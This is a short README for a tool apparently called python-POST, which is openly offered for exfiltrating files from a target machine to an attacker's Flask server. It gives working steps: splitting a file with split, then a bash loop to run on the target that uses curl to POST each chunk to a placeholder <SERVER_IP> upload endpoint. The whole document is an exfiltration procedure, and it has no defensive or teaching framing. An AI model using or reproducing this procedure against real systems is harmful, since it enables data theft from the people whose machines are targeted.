# python-POST

## What is this for?
This is a toolkit for exfiltrating over HTTP using **POST** requests to send out chunked files over to a lisening flask server running the server.py script. It requires the listening server to be running on Python 3.1 or higher and needs flask. When the script is executed it will create a folder called **upload** in the **$home** path of the user executing the script. This is where the exfiltrated files get sent to.

Install all requirements on server before runnung server.py:

`python3 -m pip install -r requirements.txt`

Step 1: Split the file into chunks

`split -b 5M yourfile.zip chunk_`


This creates:

**chunk_aa**

**chunk_ab**

**chunk_ac**

**...**

Step 2: Upload chunks with curl by creating a bash file on target with below: (Ensure you modify values like **<SERVER_IP>**)

```toml
TOTAL=$(ls chunk_* | wc -l)
INDEX=0

for f in chunk_*; do
  curl -X POST http://<SERVER_IP>:5000/upload \
    -F "file=@$f" \
    -F "filename=yourfile.zip" \
    -F "chunk_index=$INDEX" \
    -F "total_chunks=$TOTAL"

  INDEX=$((INDEX+1))
done```
